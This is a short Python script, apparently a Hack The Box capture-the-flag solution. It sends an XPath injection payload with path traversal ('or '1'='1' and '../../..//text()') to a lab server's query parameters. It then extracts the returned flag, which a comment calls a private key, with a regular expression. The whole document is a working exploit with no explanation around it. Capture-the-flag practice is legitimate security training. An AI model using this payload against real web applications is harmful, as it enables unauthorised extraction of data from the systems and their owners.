import requests
import re

#Fetch the output of the web page using X-path data exfiltration
r = requests.get("http://94.237.59.63:34183/index.php?q=*%27)+or+(%271%27%3D%271&f=../../..//text()", stream=True)

#Filter the output to only contain the flag (private key)
matches = re.findall(r"HTB..................................", r.text)
print(matches)
